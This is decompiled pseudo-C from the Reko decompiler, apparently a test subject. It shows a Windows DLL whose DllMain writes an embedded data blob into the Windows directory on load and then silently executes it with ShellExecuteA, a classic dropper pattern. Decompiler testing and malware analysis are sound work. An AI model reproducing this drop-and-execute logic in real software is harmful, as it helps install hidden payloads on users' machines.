// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 10001130: Register Eq_2 DllMain(Stack Eq_3 hModule, Stack Eq_4 dwReason, Stack Eq_5 lpReserved)
BOOL DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == 0x01)
	{
		GetWindowsDirectoryA(&globals->t10001210, 0x0400);
		lstrcatA(&globals->t10001210, &globals->t10001014);
		if (fn1000118A(edx, &globals->t10001210) != 0x00)
			ShellExecuteA(null, &globals->t10001000, &globals->t10001210, null, null, 0x00);
	}
	return 0x01;
}

// 1000118A: Register word32 fn1000118A(Register word32 edx, Stack Eq_19 dwArg04)
word32 fn1000118A(word32 edx, LPCSTR dwArg04)
{
	word32 ebx_13 = 0x00;
	Eq_3 eax_31 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x00, null);
	if (eax_31 != (void *) 0x01)
	{
		WriteFile(eax_31, &globals->v10003004, globals->t10003000, fp - 0x08, null);
		CloseHandle(eax_31);
		ebx_13 = 0x01;
	}
	return ebx_13;
}

